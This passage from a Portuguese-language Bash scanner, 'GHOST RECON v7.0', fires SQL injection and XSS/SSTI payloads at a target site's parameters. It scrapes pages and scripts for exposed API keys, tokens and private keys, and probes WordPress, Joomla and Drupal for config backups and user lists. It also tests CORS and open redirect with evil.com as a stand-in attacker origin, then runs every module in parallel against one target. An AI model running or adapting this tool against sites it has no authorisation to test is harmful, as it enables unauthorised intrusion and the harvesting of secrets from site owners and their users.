  SQLI_P=("'" "''" "' OR '1'='1" "' OR 1=1--" "\" OR 1=1--" "' UNION SELECT NULL--" "' UNION SELECT NULL,NULL--" "1 AND SLEEP(5)--" "1' AND SLEEP(5)--" "'; WAITFOR DELAY '0:0:5'--" "' ORDER BY 100--" "' AND EXTRACTVALUE(0,CONCAT(0x7e,VERSION()))--")
  SQLI_E=("sql syntax" "mysql_fetch" "You have an error in your SQL" "ORA-[0-9]" "PostgreSQL.*ERROR" "SQLSTATE" "Unclosed quotation mark" "ODBC SQL Server" "Division by zero" "DB Error" "database error" "Warning.*mysql_" "pg_query" "SQLite.*error" "Microsoft.*Database.*Error" "stack trace:")
  PARAMS=(id page cat p q search s item user uid lang type action module key name value data input order sort)
  for param in "${PARAMS[@]}"; do
    for payload in "${SQLI_P[@]}"; do
      (
      ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
      T1=$(date +%s%3N 2>/dev/null || echo 0)
      R=$(curl -sk --max-time 8 "$URL/?$param=$ENC" 2>/dev/null)
      T2=$(date +%s%3N 2>/dev/null || echo 0)
      EL=$(( T2 - T1 ))
      for err in "${SQLI_E[@]}"; do
        echo "$R"|grep -qiE "$err" && { v "SQLi Error-Based: ?$param= | $URL/?$param=$ENC"; echo "$R"|grep -iE "$err"|head -1|while read l; do s "$l"; done; exit 0; }
      done
      [ "$EL" -ge 4500 ] && v "SQLi Time-Based Blind: ?$param= (${EL}ms) | $URL/?$param=$ENC"
      ) &
      wait_jobs
    done
  done
  wait
}

# xss
xss_fn(){
  t "XSS"
  XSS_P=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg onload=alert(1)>" "\"'><script>alert(1)</script>" "{{7*7}}" "<input autofocus onfocus=alert(1)>")
  PARAMS=(q search s name value message comment title text body content query input)
  for param in "${PARAMS[@]}"; do
    for payload in "${XSS_P[@]}"; do
      (
      ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
      R=$(curl -sk --max-time 4 "$URL/?$param=$ENC" 2>/dev/null)
      echo "$R"|grep -qF "$payload" && v "XSS Refletido: ?$param= | $URL/?$param=$ENC"
      (echo "$payload"|grep -q "7\*7") && echo "$R"|grep -q "49" && v "SSTI: ?$param= | $URL/?$param=$ENC"
      ) &
      wait_jobs
    done
  done
  wait
}

# api keys
apikey_fn(){
  t "API KEYS / SECRETS"
  PAGE=$(cat "$TMP/page" 2>/dev/null || curl -sk --max-time 8 "$URL" 2>/dev/null)
  scan_keys(){
    CONTENT="$1"; SRC="$2"
    declare -A PATS=(
      ["AIza[0-9A-Za-z_-]{35}"]="Google API Key"
      ["AKIA[0-9A-Z]{16}|AKID[A-Z0-9]{16}"]="AWS Access Key"
      ["sk_live_[0-9a-zA-Z]{24,}"]="Stripe Live Key"
      ["sk_test_[0-9a-zA-Z]{24,}"]="Stripe Test Key"
      ["xox[baprs]-[0-9a-zA-Z-]{24,}"]="Slack Token"
      ["ghp_[0-9a-zA-Z]{36}"]="GitHub Token"
      ["glpat-[0-9a-zA-Z_-]{20}"]="GitLab Token"
      ["eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}"]="JWT Token"
      ["-----BEGIN.*PRIVATE KEY"]="Private Key"
      ["mongodb(\+srv)?://[^\"' ]{10,}"]="MongoDB connstr"
      ["redis://[^\"' ]{8,}"]="Redis connstr"
      ["postgres(ql)?://[^\"' ]{8,}"]="PG connstr"
      ["mysql://[^\"' ]{8,}"]="MySQL connstr"
      ["SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}"]="SendGrid Key"
      ["npm_[a-zA-Z0-9]{36}"]="NPM Token"
      ["ya29\.[0-9A-Za-z_-]+"]="Google OAuth"
      ["[Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd][\"' ]*[:=][\"' ]*[^\"' \n]{8,}"]="Hardcoded Password"
      ["[Ss][Ee][Cc][Rr][Ee][Tt][_Kk][Ee][Yy][\"' ]*[:=][\"' ]*[^\"' \n]{16,}"]="Secret Key"
      ["[Aa][Pp][Ii][_-][Kk][Ee][Yy][\"' ]*[:=][\"' ]*[^\"' \n]{16,}"]="API Key"
    )
    for pat in "${!PATS[@]}"; do
      MATCH=$(echo "$CONTENT"|grep -oiE "$pat" | head -2)
      [ -n "$MATCH" ] && v "${PATS[$pat]} em $SRC" && s "  $MATCH"
    done
  }
  scan_keys "$PAGE" "$URL"
  echo "$PAGE" | grep -oE 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//' | head -15 | while read jsf; do
    [ -z "$jsf" ] && continue
    JSURL="$URL$jsf"; [[ "$jsf" == http* ]] && JSURL="$jsf"
    (JSC=$(curl -sk --max-time 5 "$JSURL" 2>/dev/null); [ -n "$JSC" ] && scan_keys "$JSC" "$JSURL") &
    wait_jobs
  done
  wait
}

# cms
cms_fn(){
  t "CMS SCAN"
  PAGE=$(cat "$TMP/page" 2>/dev/null || curl -sk --max-time 8 "$URL" 2>/dev/null)
  if echo "$PAGE"|grep -qi "wp-content\|wp-includes"; then
    i "WordPress"
    C=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "$URL/readme.html" 2>/dev/null)
    [ "$C" = "200" ] && v "WP readme.html: $URL/readme.html"
    for f in wp-config.php.bak wp-config.php~ wp-config.php.old; do
      C=$(curl -sk --max-time 2 -o /dev/null -w "%{http_code}" "$URL/$f" 2>/dev/null)
      [ "$C" = "200" ] && v "WP config backup: $URL/$f"
    done
    WPUR=$(curl -sk --max-time 4 "$URL/wp-json/wp/v2/users" 2>/dev/null)
    echo "$WPUR"|grep -qi '"slug"' && {
      v "WP Users API: $URL/wp-json/wp/v2/users"
      echo "$WPUR"|python3 -c "import sys,json; [print('  user:',u.get('name',''),u.get('slug','')) for u in json.load(sys.stdin)]" 2>/dev/null | head -4 | while read l; do s "$l"; done
    }
    XMLRPC=$(curl -sk --max-time 3 "$URL/xmlrpc.php" 2>/dev/null)
    echo "$XMLRPC"|grep -qi "XML-RPC\|xmlrpc" && v "xmlrpc.php ativo: $URL/xmlrpc.php"
    s "Login: $URL/wp-login.php | Admin: $URL/wp-admin/"
  fi
  if echo "$PAGE"|grep -qi "joomla"; then
    i "Joomla"
    adm "$URL/administrator"
    C=$(curl -sk --max-time 2 -o /dev/null -w "%{http_code}" "$URL/configuration.php.bak" 2>/dev/null)
    [ "$C" = "200" ] && v "Joomla config backup: $URL/configuration.php.bak"
  fi
  if echo "$PAGE"|grep -qi "drupal"; then
    i "Drupal"
    adm "$URL/admin/config"
    C=$(curl -sk --max-time 2 -o /dev/null -w "%{http_code}" "$URL/sites/default/settings.php" 2>/dev/null)
    [ "$C" = "200" ] && v "Drupal settings.php: $URL/sites/default/settings.php"
  fi
}

# cors / redirect / sensitive
misc_fn(){
  t "CORS / OPEN REDIRECT / SENSITIVE DATA"
  # CORS
  CORS_R=$(curl -sI --max-time 5 -H "Origin: https://evil.com" "$URL" 2>/dev/null)
  ACAO=$(echo "$CORS_R"|grep -i "Access-Control-Allow-Origin"|head -1)
  echo "$ACAO"|grep -qi "evil.com\|\*" && v "CORS misconfiguration: $ACAO"
  echo "$CORS_R"|grep -qi "Access-Control-Allow-Credentials: true" && echo "$ACAO"|grep -qi "evil.com" && v "CORS + Credentials=true CRITICO"
  # Open redirect
  for param in url redirect return next go to dest destination href callback; do
    for payload in "https://evil.com" "//evil.com"; do
      ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
      LOC=$(curl -sk --max-time 3 -D - -o /dev/null "$URL/?$param=$ENC" 2>/dev/null | grep -i "^Location:"|head -1)
      echo "$LOC"|grep -qi "evil.com" && { v "Open Redirect: ?$param= | $URL/?$param=$ENC"; break 2; }
    done
  done
  # Sensitive data
  PAGE=$(cat "$TMP/page" 2>/dev/null || curl -sk --max-time 8 "$URL" 2>/dev/null)
  EMAILS=$(echo "$PAGE"|grep -oiE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'|grep -v "example\|test\|\.png\|sentry\|schemas"|sort -u|head -6)
  [ -n "$EMAILS" ] && w "Emails expostos:" && echo "$EMAILS"|while read e; do s "$e"; done
  INTERNAL=$(echo "$PAGE"|grep -oE '(10\.[0-9]+\.[0-9]+\.[0-9]+|172\.(1[6-9]|2[0-9]|3[01])\.[0-9]+\.[0-9]+|192\.168\.[0-9]+\.[0-9]+)'|sort -u|head -3)
  [ -n "$INTERNAL" ] && v "IPs internos expostos no HTML: $INTERNAL"
  COMMENTS=$(echo "$PAGE"|grep -oiE '<!--[^-]{5,200}-->'|grep -iE "password|secret|key|todo|hack|debug|admin|database|token"|head -3)
  [ -n "$COMMENTS" ] && v "HTML comments suspeitos: $COMMENTS"
  HDR=$(cat "$TMP/hdr" 2>/dev/null || curl -sI --max-time 5 "$URL" 2>/dev/null)
  VER=$(echo "$HDR"|grep -iE "^Server:|^X-Powered-By:|^X-Generator:"|head -2)
  [ -n "$VER" ] && w "Versao exposta: $VER"
  ROBOTS=$(curl -sk --max-time 4 "$URL/robots.txt" 2>/dev/null)
  if [ -n "$ROBOTS" ]; then
    i "robots.txt Disallow:"
    echo "$ROBOTS"|grep -i "Disallow:"|awk '{print $2}'|while read p; do [ -n "$p" ] && s "$URL$p"; done
  fi
}

# ── FASE 2: lanca tudo em paralelo ────────────────────────────
nmap_fn &
adm_fn &
db_fn &
files_fn &
dir_fn &
sqli_fn &
xss_fn &
apikey_fn &
cms_fn &
misc_fn &
wait

# ── RELATORIO FINAL ───────────────────────────────────────────
echo ""
echo "========================================" | tee -a "$LOG"
echo "GHOST RECON v7.0 | $DOMAIN ($IP)" | tee -a "$LOG"
echo "Data: $(date)" | tee -a "$LOG"
echo "Vulnerabilidades: $VULN" | tee -a "$LOG"
echo "========================================" | tee -a "$LOG"

ADM_LIST=$(cat "$TMP/adm" 2>/dev/null)
DB_LIST=$(cat "$TMP/db" 2>/dev/null)
FILE_LIST=$(cat "$TMP/files" 2>/dev/null)
VULN_LIST=$(cat "$TMP/vulns" 2>/dev/null)

[ -n "$ADM_LIST" ] && {
  echo ""
  echo -e "${W}[PAINEIS ADM ABERTOS]${N}" | tee -a "$LOG"
  echo "$ADM_LIST" | while read u; do echo -e "  ${G}>> $u${N}" | tee -a "$LOG"; done
}
[ -n "$DB_LIST" ] && {
  echo ""
  echo -e "${W}[DATABASES EXPOSTOS]${N}" | tee -a "$LOG"
  echo "$DB_LIST" | while read u; do echo -e "  ${R}>> $u${N}" | tee -a "$LOG"; done
}
[ -n "$FILE_LIST" ] && {
  echo ""
  echo -e "${W}[ARQUIVOS SENSIVEIS]${N}" | tee -a "$LOG"
  echo "$FILE_LIST" | while read u; do echo -e "  ${Y}>> $u${N}" | tee -a "$LOG"; done
}
[ -n "$VULN_LIST" ] && {
  echo ""
  echo -e "${W}[TODAS AS VULNERABILIDADES ($VULN)]${N}" | tee -a "$LOG"
  echo "$VULN_LIST" | while read u; do echo -e "  ${R}>> $u${N}" | tee -a "$LOG"; done
}

echo ""
echo -e "Log: ${C}$LOG${N}" | tee -a "$LOG"
echo "========================================" | tee -a "$LOG"

# cleanup
rm -rf "$TMP" 2>/dev/null
